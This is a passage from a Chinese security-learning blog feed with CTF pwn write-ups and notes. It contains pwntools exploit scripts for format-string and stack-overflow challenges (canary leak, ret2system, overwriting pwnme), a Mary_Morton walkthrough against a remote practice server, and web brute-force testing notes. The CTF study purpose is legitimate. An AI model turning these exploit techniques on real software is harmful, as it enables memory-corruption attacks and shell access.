href="https://blog.csdn.net/lla520/article/details/77776809?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-77776809-blog-120838022.pc_relevant_multi_platform_whitelistv4&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3">https://blog.csdn.net/lla520/article/details/77776809?utm_medium=distribute.pc_relevant.none-task-blog-2<del>default</del>baidujs_baidulandingword~default-0-77776809-blog-120838022.pc_relevant_multi_platform_whitelistv4&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3</a></p><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-attribute">libc</span>=ELF('/lib/i386-linux-gnu/i686/cmov/libc.so.6')<br><span class="hljs-attribute">p</span>=process("./pwn2")<br>context.terminal = [<span class="hljs-string">'gnome-terminal'</span>,<span class="hljs-string">'-x'</span>,<span class="hljs-string">'sh'</span>,<span class="hljs-string">'-c'</span>] <br>gdb.attach(proc.pidof(p)[0])       <br>p.recvuntil(<span class="hljs-string">'name:'</span>)<br>p.sendline(<span class="hljs-string">'%p.'</span><span class="hljs-number">*40</span>)     #输出字符串 <br><span class="hljs-attribute">leak_data</span>=p.recvuntil('messages:')<br><span class="hljs-attribute">address</span>=leak_data.split('.')                #将输出的地址分组 然后进行分组<br><span class="hljs-attribute">canary</span>=int(address[30],16)     #这里为什么是 第30个<br><span class="hljs-attribute">stack_addr</span>=int(address[33],16)-0x90+0x8+0x8     #这里也不懂<br><span class="hljs-attribute">put_addr</span>=int(address[22],16)-0x144               <br><span class="hljs-attribute">system_addr</span>=put_addr-(libc.symbols[<span class="hljs-string">'puts'</span>]-libc.symbols[<span class="hljs-string">'system'</span>])<br>payload =<span class="hljs-string">'a'</span><span class="hljs-number">*100</span>+p32(canary)+<span class="hljs-string">'a'</span><span class="hljs-number">*12</span>+p32(system_addr)+<span class="hljs-string">'bbbb'</span>+p32(stack_addr)+<span class="hljs-string">'/bin/sh\x00'</span><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><h2 id="攻防世界题解-抄作业"><a href="#攻防世界题解-抄作业" class="headerlink" title="攻防世界题解(抄作业)"></a>攻防世界题解(抄作业)</h2><h3 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h3><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs routeros"> #!/bin/usr/python2<br><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-attribute">p</span>=remote('ip',端口)<br> # <span class="hljs-attribute">p</span>=process('born')<br><span class="hljs-attribute">birth</span>=<span class="hljs-string">'1927'</span><br><span class="hljs-attribute">name</span>=<span class="hljs-string">"aaaaaaaa"</span>+p32(0x00000786)<br>p.recvuntil(<span class="hljs-string">'What'</span>s Your Birth?<span class="hljs-string">')</span><br><span class="hljs-string">p.sendline(birth)</span><br><span class="hljs-string">p.recvuntil('</span>What<span class="hljs-string">'s Your Name?'</span>)<br>p.sendline(name)<br><span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-built_in">print</span>(p.recv())<br></code></pre></td></tr></tbody></table></figure><h3 id="CGFsb"><a href="#CGFsb" class="headerlink" title="CGFsb"></a>CGFsb</h3><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros"> #!/bin/env python2<br><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-attribute">p</span>=remote('ip',端口)<br><span class="hljs-attribute">pwnme_addr</span>=0x0804A068<br><span class="hljs-attribute">payload1</span>=<span class="hljs-string">'ABCD'</span><br><span class="hljs-attribute">payload2</span>=p32(pwnme_addr)+'aaaa%10$n'<br>p.recvuntil(<span class="hljs-string">'please tell me your name:\n'</span>)<br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">'leave your message please:\n'</span>)<br>p.sendline(payload2)<br><span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-built_in">print</span>(p.recv())<br></code></pre></td></tr></tbody></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;整理以下exp的编写，根据网上文章结合个人去整理的。&lt;/p&gt;
&lt;h1 id=&quot;exp的基本框架&quot;&gt;&lt;a href=&quot;#exp的基本框架&quot; class=&quot;headerlink&quot; title=&quot;exp的基本框架&quot;&gt;&lt;/a&gt;exp的基本框架&lt;/h1&gt;&lt;pre&gt;&lt;code clas</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://sinky.top/tags/PWN/"/>
    
    <category term="exp" scheme="https://sinky.top/tags/exp/"/>
    
  </entry>
  
  <entry>
    <title>PWN常用脚本语句解释</title>
    <link href="https://sinky.top/2022/11/10/PWN%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC%E8%AF%AD%E5%8F%A5%E8%A7%A3%E9%87%8A/"/>
    <id>https://sinky.top/2022/11/10/PWN%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC%E8%AF%AD%E5%8F%A5%E8%A7%A3%E9%87%8A/</id>
    <published>2022-11-10T01:15:38.991Z</published>
    <updated>2022-11-22T08:51:27.876Z</updated>
    
    <content type="html"><![CDATA[<h1 id="接收远端传回的数据"><a href="#接收远端传回的数据" class="headerlink" title="接收远端传回的数据"></a>接收远端传回的数据</h1><pre><code class="hljs">interactive(): 在取得shell之后使用，直接进行交互，相当于回到shell的模式recv(numb=字节大小,timeout=default): 接收指定字节数recvall(): 一直接收直到达到文件EOFrecvline(keepends=True): 接收一行，keepends为是否保留行尾的\nrecvuntil(delims,drop=False): 一直读到delims的pattern出现为止recvrepeat(timeout=default): 持续接收直到EOF或timeout</code></pre><h1 id="向远端发送数据"><a href="#向远端发送数据" class="headerlink" title="向远端发送数据"></a>向远端发送数据</h1><pre><code class="hljs">send(data): 发送数据sendline(data): 发送一行数据，相当于在数据末尾加\nsendlineafter("字符串",data): 在这一串字符串结束之后发送datash.send(data): 进行数据发送，不一定是一行数据</code></pre><blockquote><p>send和sendline的区别是：sendline多发送了一次回车</p></blockquote><pre><code class="hljs">from pwn import * # 将所用模块导入到当前namespaceio=process('./pwn123') # 本地，与文件进行交互 使用了process，结尾要加interactive才能完成交互过程r=remote("xx.xx.xx.xx(注：ip)"，端口号) # 远程，连接指定IP及端口关闭远程连接使用 sh.close()r.recvuntil("字符串") # 运行到字符串位置停下r.sendline(payload) # 发送payloadcontext.log_level="debug" # 脚本在执行时就会输出debug的信息，可以通过观察这些信息查找出错点或者 contex(arch='amd64',os='linux',log_level='debug')gdb.attach(io)pause() # 对脚本进行调试</code></pre><ul><li>打包数据：p64()或p32() </li><li>解包数据：u64()或u32()</li></ul><p>bin文件操作：</p><pre><code class="hljs">elf=ELF("binfilepath")libc=ELF("libcpath")</code></pre><p>得到程序bss段的起始位置：<code>bss_base_addr=elf.bss()</code></p><ul><li>PLT  <code>write_plt=elf.plt["write"]</code></li><li>GOT  <code>write_plt=elf.got["write"]</code></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;接收远端传回的数据&quot;&gt;&lt;a href=&quot;#接收远端传回的数据&quot; class=&quot;headerlink&quot; title=&quot;接收远端传回的数据&quot;&gt;&lt;/a&gt;接收远端传回的数据&lt;/h1&gt;&lt;pre&gt;&lt;code class=&quot;hljs&quot;&gt;interactive(): 在取得she</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://sinky.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>pwn之checksec学习</title>
    <link href="https://sinky.top/2022/11/08/pwn%E4%B9%8Bchecksec%E5%AD%A6%E4%B9%A0/"/>
    <id>https://sinky.top/2022/11/08/pwn%E4%B9%8Bchecksec%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-11-08T08:37:25.377Z</published>
    <updated>2022-11-29T08:10:22.393Z</updated>
    
    <content type="html"><![CDATA[<p>我忘记了之前有没有写关于这个的笔记，反正我都不记得了，所以再学一遍！</p><p>checksec主要用于查看题目开启了哪些保护机制。</p><h1 id="Arch"><a href="#Arch" class="headerlink" title="Arch"></a>Arch</h1><p>程序架构信息，判断是64位还是32位</p><h1 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h1><p>主要针对GOT改写的攻击方式，分为Partial RELRO和Full RELRO。</p><p>Partial RELRO：表示got表可写，容易受到攻击</p><p>Full RELRO：表示got表不可写，只读，无法被覆盖，会增加程序启动时间</p><h1 id="Stack-canary"><a href="#Stack-canary" class="headerlink" title="Stack-canary"></a>Stack-canary</h1><p>Canary翻译为金丝雀，应用于在栈保护上是在初始化一个栈帧时在栈底设置一个随机的canary值，当函数返回时监测canary是否改变，以此判断stack/buffer overflow是否发生，改变则说明栈溢出发生，程序走另一个流程结束一面漏洞利用成功，因此我们需要获取canary值或防止出发stack_chk_fall函数。</p><pre><code class="hljs">gcc -fno-stack-protector -o hello test.c   //禁用栈保护gcc -fstack-protector -o hello test.c    //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码gcc -fstack-protector-all -o hello test.c  //启用堆栈保护，为所有函数插入保护代码</code></pre><h1 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h1><p>NX enable 可不执行内存</p><p>最常见方法为ROP,利用栈溢出在栈上布置地址，每个内存地址对应一个gadget，利用ret等指令进行衔接来执行某项功能，最终达到pwn掉程序的目的。</p><p>gcc默认开启NX选项。</p><p>这个保护开启就是意味着栈中数据没有执行权限，如此一来, 当攻击者在堆栈上部署自己的 shellcode 并触发时, 只会直接造成程序的崩溃，但是可以利用rop这种方法绕过</p><h1 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h1><p>位置无关可执行文件，地址空间分布随机化</p><p>与ASLR类似，将程序运行时的对堆栈以及共享库的加载地址随机化，而PIE技术则在编译时将程序编译为位置无关，即程序运行时各个段加载的虚拟地址也是在装载时才确定，在PIE和ASLR同时开启时攻击者将对程序的内存布局一无所知，got表方法也难以进行，无法获取程序.got表的虚地址。</p><pre><code class="hljs">0 - 表示关闭进程地址空间随机化。1 - 表示将mmap的基址，stack和vdso页面随机化。2 - 表示在1的基础上增加栈（heap）的随机化。</code></pre><p>（据说出了新版checksec，但是我没安装呢）</p><p>此处贴一个GDB调试技巧<br><a href="https://blog.csdn.net/lla520/article/details/77776809?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-77776809-blog-120838022.pc_relevant_multi_platform_whitelistv4&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3" title="GDB调试技巧和exp模板">https://blog.csdn.net/lla520/article/details/77776809?utm_medium=distribute.pc_relevant.none-task-blog-2<del>default</del>baidujs_baidulandingword~default-0-77776809-blog-120838022.pc_relevant_multi_platform_whitelistv4&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我忘记了之前有没有写关于这个的笔记，反正我都不记得了，所以再学一遍！&lt;/p&gt;
&lt;p&gt;checksec主要用于查看题目开启了哪些保护机制。&lt;/p&gt;
&lt;h1 id=&quot;Arch&quot;&gt;&lt;a href=&quot;#Arch&quot; class=&quot;headerlink&quot; title=&quot;Arch&quot;&gt;&lt;/</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://sinky.top/tags/pwn/"/>
    
    <category term="checksec" scheme="https://sinky.top/tags/checksec/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-Mary_Morton</title>
    <link href="https://sinky.top/2022/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Mary_Morton/"/>
    <id>https://sinky.top/2022/11/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Mary_Morton/</id>
    <published>2022-11-08T08:24:16.075Z</published>
    <updated>2022-11-10T05:30:42.846Z</updated>
    
    <content type="html"><![CDATA[<p>9命，太久没做pwn了，我连最基本的一些工具都忘记了，完全都不记得pwn怎么打了，我好菜，从头开始！</p><h1 id="查文件"><a href="#查文件" class="headerlink" title="查文件"></a>查文件</h1><ol><li>file查看文件属性，elf64位文件</li><li>checksec查看保护机制</li></ol><p><img src="https://s2.loli.net/2022/11/08/A87ktmN1Sy5g9QJ.png" alt="image.png"></p><p>64位文件；</p><p>开启了Partial RELRO，表示got表可写；</p><p>开启了NX，栈不可执行；</p><p>无PIE；</p><p>开启了canary，不能直接栈溢出覆盖返回地址，因为在初始化一个栈帧时在栈底设置一个随机的canary值，函数返回之时会检测canary是否改变。</p><p>运行程序</p><p><img src="https://s2.loli.net/2022/11/09/WlYMdrTOVoR5kvD.png" alt="image.png"></p><p>1-栈溢出漏洞；2-格式化字符串漏洞；3-退出</p><h1 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h1><p>IDA打开找到main函数：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs awk">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)<br>{<br>  int v3; <span class="hljs-regexp">//</span> [sp+<span class="hljs-number">24</span>h] [bp-Ch]@<span class="hljs-number">2</span><br>  __int64 v4; <span class="hljs-regexp">//</span> [sp+<span class="hljs-number">28</span>h] [bp-<span class="hljs-number">8</span>h]@<span class="hljs-number">1</span><br>  v4 = *MK_FP(__FS__, <span class="hljs-number">40</span>LL);<br>  sub_4009FF();<br>  puts(<span class="hljs-string">"Welcome to the battle ! "</span>);<br>  puts(<span class="hljs-string">"[Great Fairy] level pwned "</span>);<br>  puts(<span class="hljs-string">"Select your weapon "</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    {<br>      sub_4009DA();<br>      __isoc99_scanf(<span class="hljs-string">"%d"</span>, &amp;v3);                <span class="hljs-regexp">//</span> 选择项 <span class="hljs-number">1</span>，<span class="hljs-number">2</span>，<span class="hljs-number">3</span><br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">break</span>;<br>      sub_4008EB();                             <span class="hljs-regexp">//</span> printf 格式化字符串<br>    }<br>    <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">3</span> )<br>    {<br>      puts(<span class="hljs-string">"Bye "</span>);<br>      <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>    }<br>    <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">1</span> )<br>      sub_400960();                             <span class="hljs-regexp">//</span> 触发canary，含栈溢出<br>    <span class="hljs-keyword">else</span><br>      puts(<span class="hljs-string">"Wrong!"</span>);<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>格式化字符串：</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">__int64 sub<span class="hljs-constructor">_4008EB()</span><br>{<br>  <span class="hljs-built_in">char</span> buf; <span class="hljs-comment">// [sp+0h] [bp-90h]@1</span><br>  __int64 v2; <span class="hljs-comment">// [sp+88h] [bp-8h]@1</span><br>  v2 = *<span class="hljs-constructor">MK_FP(<span class="hljs-params">__FS__</span>, 0x28LL)</span>;                  <span class="hljs-comment">// 从位置FS:[0x28u]读取双字内容</span><br>  memset(&amp;buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>uLL);<br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x7F</span>uLL);<br>  printf(&amp;buf, &amp;buf);<br>  return *<span class="hljs-constructor">MK_FP(<span class="hljs-params">__FS__</span>, 40LL)</span> ^ v2;<br>}<br></code></pre></td></tr></tbody></table></figure><p>栈溢出：</p><figure class="highlight perl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">__int64 sub_40096<span class="hljs-number">0</span>()<br>{<br>  char buf; <span class="hljs-regexp">//</span> [sp+0h] [bp-<span class="hljs-number">90</span>h]@1<br>  __int64 v2; <span class="hljs-regexp">//</span> [sp+<span class="hljs-number">88</span>h] [bp-<span class="hljs-number">8</span>h]@1<br>  v2 = *MK_FP(__FS_<span class="hljs-number">_</span>, <span class="hljs-number">0x28</span>LL);                  <span class="hljs-regexp">//</span> canary标志<br>  memset(&amp;buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>uLL);<br>  <span class="hljs-keyword">read</span>(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x100</span>uLL);                      <span class="hljs-regexp">//</span> 栈溢出<br>  <span class="hljs-keyword">printf</span>(<span class="hljs-string">"-&gt; %s\n"</span>, &amp;buf);<br>  <span class="hljs-keyword">return</span> *MK_FP(__FS_<span class="hljs-number">_</span>, <span class="hljs-number">40</span>LL) ^ v2;<br>}<br></code></pre></td></tr></tbody></table></figure><p>查看流程图：</p><p><img src="https://s2.loli.net/2022/11/09/tFhGesgyKAc3CYm.png" alt="image.png"></p><p>分析可知<code>v2 = *MK_FP(__FS__, 0x28LL);</code>有canary保护，只有rax与fs:28h相等，才能跳转到返回值，反之则调用<code>stak_chk_fail</code></p><p>查看字符串发现有 cat flag:</p><p><img src="https://s2.loli.net/2022/11/09/ftOmIBaWVwlAzcN.png" alt="image.png"></p><p>地址：<code>0x4008DA</code></p><p>思路：</p><p>利用字符串漏洞泄露canary值，在函数返回的时候再填回去，然后利用栈溢出让其返回后门函数。</p><p>（我的IDA不知道为什么解析不出来这个函数体，不过应该问题不大）</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>先测一下字符串漏洞的偏移，payload一般为：</p><pre><code class="hljs">AAAA-%x-%x-%x-%x…</code></pre><p><img src="https://s2.loli.net/2022/11/09/fhgGbe9mZs5oNI4.png" alt="image.png"></p><p>偏移了6个字节。</p><p>canary与输入参数之间的偏移：</p><p><img src="https://s2.loli.net/2022/11/09/sDH8EhMNtwgQB29.png" alt="image.png"></p><p>计算泄露特定地址的payload一般构造为</p><pre><code class="hljs">(target_addr - start_addr + offset) / address_bytes_length（64位为8，32位为4）</code></pre><p>buf和v2相差： 0x90-0x8=0x88,0x88/8=17,17+6=23</p><ul><li>64位程序，一个字符占8字节（32位是4字节），所以buf和v2相差0x88，转十进制为136，除以8，即相差17个字节</li><li>由于buf是格式化字符串的第6个参数，所以v2是格式化字符串的第17+6=23个参数。</li></ul><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <span class="hljs-comment"># 导入pwn模块</span><br>p=remote(<span class="hljs-string">'61.147.171.105'</span>,<span class="hljs-number">53266</span>)<br> <span class="hljs-comment"># 远程交互</span><br>p.sendlineafter(<span class="hljs-string">'3. Exit the battle'</span>,<span class="hljs-string">'2'</span>)<br> <span class="hljs-comment"># 在接收到`3. Exit`后输入2进入格式化字符串漏洞环节</span><br>p.sendline(<span class="hljs-string">'%23$p'</span>)<br> <span class="hljs-comment"># 发送%23$p,让程序输出canary的值 (不明白为什么23位是这样写的)</span><br>p.recvuntil(<span class="hljs-string">'0x'</span>)<br> <span class="hljs-comment"># 读到0x出现为止</span><br>canary=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br> <span class="hljs-comment"># canary接收整型16字节数</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">"canary:  "</span> + <span class="hljs-built_in">hex</span>(canary)<br> <span class="hljs-comment"># canary转十六进制</span><br>flag_addr=<span class="hljs-number">0x4008da</span><br>payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x88</span>+p64(canary)+<span class="hljs-string">'a'</span>*<span class="hljs-number">8</span>+p64(flag_addr)<br> <span class="hljs-comment"># 用a填充相差的0x88，跟上第23位的canary值，加上flag地址，最后64位对其填上a*8</span><br>p.sendlineafter(<span class="hljs-string">'3. Exit the battle'</span>,<span class="hljs-string">'1'</span>)<br> <span class="hljs-comment"># 读到3.Exit之后输入1 进入栈溢出环节</span><br>p.sendline(payload)<br> <span class="hljs-comment"># 发送payload</span><br>p.interactive()<br> <span class="hljs-comment"># 结束交互</span><br></code></pre></td></tr></tbody></table></figure><p>（题目描述说是非常简单的热身pwn，呵呵）</p><h1 id="拓展：canary"><a href="#拓展：canary" class="headerlink" title="拓展：canary"></a>拓展：canary</h1><p>对于64位程序，在开始运行时，就会随机生成canary，存放在 TLS结构体 tcbhead_t 偏移为 0x28 的位置，带有缓冲区的函数在函数开头就会利于 FS指针 从该位置取出canary的值将其置于 rbp-0x8 的位置，在函数返回时，就会比较 FS[0x28] 里原本的canary和栈上的canary，若相等，程序继续向下执行；若不相等，进入处理栈溢出的函数—— stack_chk_fail,它会让程序终止并且抛出报错 “stack smahing detected”</p><h1 id="拓展：格式化字符串漏洞"><a href="#拓展：格式化字符串漏洞" class="headerlink" title="拓展：格式化字符串漏洞"></a>拓展：格式化字符串漏洞</h1><p>虽然之前有写过笔记，但是忘记了，所以再记录一遍。</p><p>在C语言中的printf,fprintf,sprintf,snprintf等print函数等用到类似<code>%</code>形式的一个或多个说明符，例如<code>printf("I am %s",lihua);</code></p><p>第一个参数就是格式化字符串，它主要依靠一个可以用来告诉程序如何进行格式化输出的说明符。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>原理就是程序员偷懒将格式化字符串操作全交给了用户，产生任意地址读写的漏洞。</p><p>正确的函数：</p><pre><code class="hljs">char str[100];scanf("%s",str);printf("%s",str);</code></pre><p>有漏洞的函数：</p><pre><code class="hljs">char str[100];scanf("%s",str);printf(str);</code></pre><p>因为printf函数是可变参数的函数，如果用户输入参数位<code>%x</code>，那么就会输出内存中的数据，因为没有指定参数个数，没有限制输出类型，所以程序遇到<code>%</code>就会根据相应的规则去取相应的参数，直到检索到格式化字符串结束，造成内存泄露。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;9命，太久没做pwn了，我连最基本的一些工具都忘记了，完全都不记得pwn怎么打了，我好菜，从头开始！&lt;/p&gt;
&lt;h1 id=&quot;查文件&quot;&gt;&lt;a href=&quot;#查文件&quot; class=&quot;headerlink&quot; title=&quot;查文件&quot;&gt;&lt;/a&gt;查文件&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;fi</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://sinky.top/tags/PWN/"/>
    
    <category term="CTF" scheme="https://sinky.top/tags/CTF/"/>
    
    <category term="攻防世界" scheme="https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
  </entry>
  
  <entry>
    <title>Web攻防业务安全实战指南笔记</title>
    <link href="https://sinky.top/2022/11/08/Web%E6%94%BB%E9%98%B2%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/"/>
    <id>https://sinky.top/2022/11/08/Web%E6%94%BB%E9%98%B2%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/</id>
    <published>2022-11-08T02:59:37.010Z</published>
    <updated>2022-11-24T02:58:02.008Z</updated>
    
    <content type="html"><![CDATA[<p>业务安全测试通常是指针对业务运行的软硬件平台，业务系统所提供的服务进行安全测试，保护业务系统免受安全威胁，以验证业务系统符合安全需求定义和安全标准的过程。</p><p>业务风险点识别应主要关注以下安全风险内容：</p><ol><li>业务环节存在的安全风险：业务环节存在的安全风险指的是业务使用者课件的业务存在的安全风险，如注册、登录和密码找回等身份认真环节，是否存在完善的验证码机制、数据一致性校验机制、Session和Cookie校验机制等，是否能规避验证码绕过、暴力破解和Sql注入等漏洞。</li><li>支持系统存在的安全风险：支持系统存在的安全风险，如用户访问控制机制是否完善，是否存在水平越权或垂直越权漏洞。系统内加密存储机制是否完善，业务数据是否明文传输，系统使用的业务接口是否可以未授权访问/调用，是否可以调用重放、遍历，接口调用参数是否可篡改等。</li><li>业务环节间存在的安全风险：业务环节间存在的安全风险，如系统业务流程是否存在乱序，导致某个业务环节可绕过、回退，或某个业务请求可以无限重放。业务环节间传输的数据是否有一致性校验机制，是否存在业务数据可被篡改的风险。</li><li>支持系统间存在的安全风险：支持系统间存在的安全风险，如系统间数据传输是否加密、系统间传输的参数是否可篡改。系统间输入参数的过滤机制是否完善，是否可能导致sql注入、xss跨站脚本和代码执行漏洞。</li><li>业务环节与支持系统间存在的安全风险：业务环节与支持系统间存在的风险，如数据传输是否加密、加密方式是否完善，是否采用前端加密、简单md5编码等不安全的加密方式。系统处理多线程并发请求的机制是否完善，服务端逻辑与数据库读写是否存在时序问题，导致竞争条件漏洞，系统间输入参数的过滤机制是否完善。</li></ol><h1 id="技术篇"><a href="#技术篇" class="headerlink" title="技术篇"></a>技术篇</h1><h2 id="登录认证模块测试"><a href="#登录认证模块测试" class="headerlink" title="登录认证模块测试"></a>登录认证模块测试</h2><h3 id="暴力破解测试"><a href="#暴力破解测试" class="headerlink" title="暴力破解测试"></a>暴力破解测试</h3><p>暴力破解测试是指针对应用系统用户登录账号与密码进行的穷举测试，针对账号或密码进行逐一比较，直到找出正确的账号密码。</p><ul><li>在已知账号的情况下，加载密码字典针对密码进行穷举测试；</li><li>在未知账号的情况下，加载账号字典，并结合密码字典进行穷举测试。</li><li>在未知账号和密码的情况下，利用账号字典和密码字典进行穷举测试。</li></ul><h4 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h4><p>使用手工或工具对系统登录认证的账号及密码进行穷举访问测试，根据系统返回的数据信息来判别账号及密码是否正确。</p><ol><li>对浏览器进行http代理配置，将浏览器访问请求指向bp工具默认的监听端口。</li></ol><h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><ol><li>增加验证码，登录失败一次，验证码变换一次。</li><li>配置登录失败次数限制策略，如在同一用户尝试登录的情况下，5分钟内连续登录失败超过6次，则禁止此用户在3小时内登录系统。</li><li>在条件允许的情况下，增加手机接收短信验证码或邮箱接收邮件验证码，实现双因素认证的防暴力破解机制。</li></ol><p>##本地加密传输测试<br>本机加密传输测试是针对客户端与服务器的数据传输，查看数据是否采用ssl加密方式加密。<br>###测试过程<br>测试验证客户端与服务器交互数据在网络传输过程中是否采用ssl进行加密处理，加密数据是否可被破解。</p><h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><p>在架设web应用的服务器上部署有效的ssl证书服务</p><h2 id="Session测试"><a href="#Session测试" class="headerlink" title="Session测试"></a>Session测试</h2><h3 id="测试原理和方法"><a href="#测试原理和方法" class="headerlink" 